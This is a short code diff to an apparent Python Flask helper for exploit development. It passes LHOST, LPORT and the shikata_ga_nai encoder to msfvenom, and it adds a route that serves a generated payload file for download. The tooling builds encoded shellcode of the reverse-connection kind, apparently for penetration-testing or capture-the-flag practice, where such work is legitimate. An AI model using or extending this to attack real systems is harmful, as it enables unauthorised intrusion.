@@ -255,7 +255,6 @@ def generate_shellcode():
         flags.append("LHOST="+lhost)
         flags.append("LPORT="+str(lport))
         flags.append("-e x86/shikata_ga_nai")
-
     flags.append('2> /dev/null')
     cmd = " ".join(flags)
     msfvenom = "/usr/bin/msfvenom " + cmd
@@ -489,6 +488,14 @@ def download_bad_chars():
         f.write(generate_bad_chars(get_bad_chars(True)))
     # shutdown_server()
     return send_file("bad_chars.txt", as_attachment=True)
+
+
+@api.route("/download_payload")
+def send_payload_web():
+    create_payload()
+    with open('payload.txt', 'wb') as f:
+        f.write(cache.get('payload'))
+    return send_file("payload.txt", as_attachment=True)
 
 
 cache.set('lport', args.lport)
